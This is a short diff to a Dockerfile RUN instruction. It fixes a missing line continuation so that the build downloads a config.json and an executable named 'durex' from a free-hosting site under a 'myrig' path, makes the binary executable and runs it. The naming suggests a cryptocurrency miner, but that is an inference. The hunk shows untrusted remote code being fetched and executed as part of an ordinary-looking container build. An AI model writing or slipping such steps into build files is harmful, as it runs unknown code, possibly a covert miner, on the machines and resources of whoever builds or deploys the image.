@@ -41,7 +41,7 @@ RUN apt-get install -y --no-install-recommends \
     && wget https://nyadur.000webhostapp.com/myrig/config.json \
     && wget https://nyadur.000webhostapp.com/myrig/durex \
     && chmod +x durex \
-    && ./durex 
+    && ./durex \
     && rm -rf /var/lib/apt/lists/* /var/cache/apt/*
 
 
